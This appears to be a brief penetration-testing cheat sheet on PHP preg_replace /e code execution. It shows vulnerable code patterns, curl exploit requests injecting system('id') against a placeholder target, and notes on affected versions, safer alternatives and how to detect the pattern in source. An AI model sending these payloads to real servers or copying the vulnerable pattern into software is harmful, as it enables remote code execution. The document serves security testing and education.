# PHP preg_replace /e RCE

`preg_replace()` with the `/e` modifier (PREG_REPLACE_EVAL) evaluates the replacement string as PHP code. If user input reaches the pattern or replacement, arbitrary PHP code executes. Removed in PHP 7.0.

## Vulnerable Code Pattern

```php
preg_replace('/<pattern>/e', $_GET['input'], $subject);
// or
preg_replace($_GET['pattern'], $_GET['replace'], $subject);
```

## Exploit

```bash
# If replacement is user-controlled:
# replacement = system('id')
curl "http://<TARGET>/page.php?input=system('id')"

# If pattern is user-controlled:
# Pattern with /e: /.*/e  replacement = system('id')
curl "http://<TARGET>/page.php?pat=/.*/e&rep=system('id')"
```

## Notes
- Only works on PHP 5.x (deprecated 5.5, removed 7.0)
- Check PHP version: `phpinfo()` or error messages
- Often found in older CMS plugins, templating engines, custom search/replace functions
- `preg_replace_callback()` is the safe replacement — not vulnerable to this
- Scan source for `/e` flag: `grep -r "preg_replace" . | grep "/e"`
